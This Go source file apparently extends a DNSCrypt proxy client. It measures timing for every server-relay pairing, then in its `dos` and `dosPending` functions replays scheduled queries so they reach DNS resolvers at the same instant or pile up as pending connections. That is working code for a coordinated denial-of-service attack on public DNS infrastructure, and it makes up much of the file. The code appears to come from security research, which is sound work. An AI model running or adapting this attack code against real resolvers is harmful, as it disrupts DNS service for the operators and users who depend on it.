package main

import (
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"github.com/jedisct1/dlog"
	"github.com/miekg/dns"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type ResolveRequestBody struct {
	Name           string `json:"name"`
	Server         string `json:"server"`
	RelayName      string `json:"relayName"`
	ServerProtocol string `json:"serverProtocol"`
	QType          string `json:"qType"`
	TimeWait       int    `json:"timeWait"`
}

type ResolveResponseTXTBody struct {
	RecvTime int64 `json:"RecvTime"`
	RecvIp   struct {
		IP   string `json:"IP"`
		Port int    `json:"Port"`
		Zone string `json:"Zone"`
	} `json:"RecvIp"`
}

func readCsvFile(filePath string) [][]string {
	f, err := os.Open(filePath)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	csvReader := csv.NewReader(f)
	records, err := csvReader.ReadAll()
	if err != nil {
		log.Fatal("Unable to parse file as CSV for "+filePath, err)
	}

	return records
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func NowUnixMillion() int64 {
	return timeNow().UnixMilli()
}

func (app *App) buildQuery(server string, relay string, qtype uint16, multiLevel bool) *dns.Msg {
	// remove '.' in server and relay
	server = strings.ReplaceAll(server, ".", "-")
	relay = strings.ReplaceAll(relay, ".", "-")
	server = server[:min(len(server), 25)]
	relay = relay[:min(len(relay), 25)]

	domain := fmt.Sprintf("%s,%s,%s.test.xxt.asia", server, relay, RandStringRunes(8))
	// add many levels to trigger more query minimization
	if multiLevel {
		domain = "a.b.c.d.e.f.g.h.i.j.k.l." + domain
	}
	q := new(dns.Msg)
	q.SetQuestion(dns.Fqdn(domain), qtype)
	return q
}

func GCD(a, b int) int {
	for b != 0 {
		t := b
		b = a % b
		a = t
	}
	return a
}

type SRPair struct {
	Server string
	Relay  string
}

func (app *App) probe(limit int, maxConcurrent int, multiLevel bool) {
	// Iterate through all servers and relays
	servers := app.proxy.serversInfo.inner
	relays := app.proxy.registeredRelays
	k := GCD(len(servers), len(relays))

	srList := make([]SRPair, 0)

	for start := 0; start < k; start++ {
		i, j := 0, start
		for {
			srList = append(srList, SRPair{
				Server: servers[i].Name,
				Relay:  relays[j].getName(),
			})

			i = (i + 1) % len(servers)
			j = (j + 1) % len(relays)

			if i == 0 && j == start {
				break
			}
		}
	}

	dlog.Debugf("Servers: %d, Relays: %d, Pairs: %d", len(servers), len(relays), len(srList))
	fout, err := os.OpenFile("probe_result.csv", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatal("Unable to read input file ", err)
		return
	}
	defer func() {
		fout.Close()
		log.Println("Probe finished")
	}()

	fout.WriteString("server,relay,sendTime,realArrivalTime,realRtt\n")
	lock := sync.Mutex{}

	failTimes := 0
	maxFailTimes := 5
	groupSize := min(len(servers), len(relays))
	iterTime := max(len(servers), len(relays))

	// Set max concurrent
	if maxConcurrent <= 0 {
		maxConcurrent = groupSize
	}
	countChannel := make(chan struct{}, maxConcurrent)
	wg := sync.WaitGroup{}
	wg.Add(min(iterTime*groupSize, limit))
	defer wg.Wait()

	for i := 0; i < iterTime; i++ {
		for j := 0; j < groupSize; j++ {
			index := i*groupSize + j
			server := srList[index].Server
			relay := srList[index].Relay

			go func(server string, relay string) {
				countChannel <- struct{}{}
				defer func() {
					<-countChannel
					wg.Done()
				}()

				start := time.Now()
				defer func() {
					elapsed := time.Since(start)
					dlog.Debugf("Current progress: %d/%d, %s-%s, average time: %dms",
						index+1, iterTime*groupSize, server, relay, elapsed.Milliseconds()/10)
				}()

				for reqSeq := 0; reqSeq < 10; reqSeq++ {
					// Send query
					q := app.buildQuery(server, relay, dns.TypeTXT, multiLevel)

					sendTime := NowUnixMillion()
					resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q, 0)

					if err != nil || resp == nil {
						dlog.Warnf("Probe failed: %s,%s, err: %v, resp: %v, realRtt: %dms", server, relay, err, resp, realRtt)
						failTimes += 1
						if failTimes > maxFailTimes {
							break
						} else {
							reqSeq--
							continue
						}
					} else if len(resp.Answer) == 0 {
						dlog.Warnf("Probe failed: %s,%s, resp.Answer is empty", server, relay)
						break
					} else {
						failTimes = 0
					}

					txtDataEncoded := resp.Answer[0].(*dns.TXT).Txt[0]
					txtData, err := base64.StdEncoding.DecodeString(txtDataEncoded)
					txtJson := &ResolveResponseTXTBody{}
					json.Unmarshal(txtData, txtJson)
					realArrivalTime := txtJson.RecvTime

					lock.Lock()
					fout.WriteString(fmt.Sprintf("%s,%s,%d,%d,%d\n", server, relay, sendTime, realArrivalTime, realRtt))
					lock.Unlock()
				}
			}(server, relay)

			// Limit the number of probes
			if limit > 0 && index+1 >= limit {
				return
			}
		}
		log.Printf("Batch probe process: %d/%d, failtimes: %d, totalTimes: %d, failRate: %.2f",
			i+1, iterTime, failTimes, iterTime*groupSize, float64(failTimes)/float64(iterTime*groupSize))
	}
}

func (app *App) randomQueryTest(num int, qtype uint16) {
	wg := sync.WaitGroup{}
	wg.Add(num)
	for i := 0; i < num; i++ {
		go func() {
			defer wg.Done()
			// randomly select a server
			server := app.proxy.serversInfo.inner[rand.Intn(len(app.proxy.serversInfo.inner))].Name
			// randomly select a relay
			relay := app.proxy.registeredRelays[rand.Intn(len(app.proxy.registeredRelays))].getName()
			// build query
			q := app.buildQuery(server, relay, qtype, false)
			// send query
			resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q, 0)
			if err != nil || resp == nil {
				dlog.Warn(fmt.Sprintf("server: %s, relay: %s, err: %v", server, relay, err))
				return
			}

			if len(resp.Answer) == 0 {
				dlog.Warn(fmt.Sprintf("server: %s, relay: %s, resp.Answer is empty", server, relay))
				return
			}

			var realArrivalTime int64 = 0
			var realResolverAddr = ""
			if q.Question[0].Qtype == dns.TypeTXT {
				txtDataEncoded := resp.Answer[0].(*dns.TXT).Txt[0]
				txtData, _ := base64.StdEncoding.DecodeString(txtDataEncoded)
				txtJson := &ResolveResponseTXTBody{}
				json.Unmarshal(txtData, txtJson)
				realArrivalTime = txtJson.RecvTime
				realResolverAddr = net.JoinHostPort(txtJson.RecvIp.IP, strconv.Itoa(txtJson.RecvIp.Port))
			}

			log.Printf("server: %s, relay: %s, realArrivalTime: %d, realResolverAddr: %s, realRtt: %d",
				server, relay, realArrivalTime, realResolverAddr, realRtt)
		}()
	}
	wg.Wait()
}

func (app *App) dos(qtype uint16, multiLevel bool) {
	// load prepared list
	fout, err := os.OpenFile("send_result.csv", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatal("Unable to read input file ", err)
	}
	fout.WriteString("server,relay,sendTime,realSendTime,sendTimeDiff,arrivalTime,realArrivalTime,realRtt,rtt,variation\n")

	path, _ := os.Getwd()
	fmt.Println("Prepared list: " + path) // for example /home/user

	records := readCsvFile("./prepared_list.csv")[1:]
	fmt.Println("Prepared list length: ", len(records))

	// start dos
	var totalCount atomic.Uint64
	var successCount atomic.Uint64
	// get the minimum sendTime
	minSendTime := int64(0)
	for _, record := range records {
		sendTime, _ := strconv.ParseInt(record[2], 10, 64)
		if minSendTime == 0 || sendTime < minSendTime {
			minSendTime = sendTime
		}
	}
	// adjust sendTime and arrivalTime
	offset := NowUnixMillion() - minSendTime + 1000
	for _, record := range records {
		sendTime, _ := strconv.ParseInt(record[2], 10, 64)
		arrivalTime, _ := strconv.ParseInt(record[3], 10, 64)

		// 1000ms delay before first send
		sendTime = sendTime + offset
		arrivalTime = arrivalTime + offset

		record[2] = strconv.FormatInt(sendTime, 10)
		record[3] = strconv.FormatInt(arrivalTime, 10)
	}

	lock := sync.Mutex{}
	wg := sync.WaitGroup{}
	wg.Add(len(records))
	for i, record := range records {
		recordCopy := make([]string, len(record))
		copy(recordCopy, record)

		go func(record []string, index int) {
			defer wg.Done()

			server := record[0]
			relay := record[1]
			sendTime, _ := strconv.ParseInt(record[2], 10, 64)
			arrivalTime, _ := strconv.ParseInt(record[3], 10, 64)
			rtt, _ := strconv.ParseFloat(record[4], 64)
			variation, _ := strconv.ParseFloat(record[5], 64)

			// make a query for {server}-{relay}-{#randomStr}-{index}.test.xxt.asia
			q := app.buildQuery(server, relay, qtype, multiLevel)

			// Sleep until sendTime
			sleepTime := time.Duration(sendTime-NowUnixMillion()) * time.Millisecond
			if sleepTime > 0 {
				log.Println("Sleep time: ", sleepTime, "ms")
				time.Sleep(sleepTime)
			}

			realSendTime := NowUnixMillion()
			resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q, 0)

			// Increase totalCount
			totalCount.Add(1)

			if err != nil {
				dlog.Warn(err)
				return
			} else if len(resp.Answer) == 0 {
				dlog.Warn("resp.Answer is empty")
				return
			}

			var realArrivalTime int64
			var sendTimeDiff int64
			if q.Question[0].Qtype == dns.TypeA {
				realArrivalTime = 0
				sendTimeDiff = 0
			} else {
				sendTimeDiff = realSendTime - sendTime
				txtDataEncoded := resp.Answer[0].(*dns.TXT).Txt[0]
				txtData, _ := base64.StdEncoding.DecodeString(txtDataEncoded)
				txtJson := &ResolveResponseTXTBody{}
				json.Unmarshal(txtData, txtJson)
				realArrivalTime = txtJson.RecvTime
			}

			// write send result to file
			lock.Lock()
			fout.WriteString(fmt.Sprintf("%s,%s,%d,%d,%d,%d,%d,%d,%.2f,%.2f\n",
				server, relay, sendTime, realSendTime, sendTimeDiff, arrivalTime, realArrivalTime, realRtt, rtt, variation))
			//log.Println("Current progress: ", totalCount, "/", len(records))
			lock.Unlock()

			successCount.Add(1)
			//fmt.Println(server, relay, realRtt, resp.Answer)
		}(recordCopy, i)
	}
	wg.Wait()
	log.Printf("DOS finised with %d/%d success: %d success rate: %.2f", totalCount.Load(), len(records),
		successCount.Load(), float64(successCount.Load())/float64(totalCount.Load()))
	log.Printf("Params: qtype: %s, multiLevel: %v", dns.TypeToString[qtype], multiLevel)
	fout.Close()
}

func (app *App) dosPending(qtype uint16, multiLevel bool) {
	server := "myserver"
	relay := "myrelay"

	// make a query for {server}-{relay}-{#randomStr}.test.xxt.asia
	qps := 10
	sendInterval := 1000 / qps

	wg := sync.WaitGroup{}
	wg.Add(qps)
	for delay := 9000; delay > 0; delay -= sendInterval {
		// save intermediate result
		delay := delay
		time.Sleep(time.Duration(sendInterval) * time.Millisecond)
		go func() {
			q := app.buildQuery(server, relay, qtype, multiLevel)
			resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q,
				time.Duration(delay)*time.Millisecond)
			if err != nil {
				dlog.Warn(err)
				return
			}

			if len(resp.Answer) == 0 {
				dlog.Warn("resp.Answer is empty")
				return
			}

			log.Println("Current progress: ", delay, "ms, realRtt: ", realRtt, "ms")
		}()
	}
	log.Println("DOS pending attack finised")
}
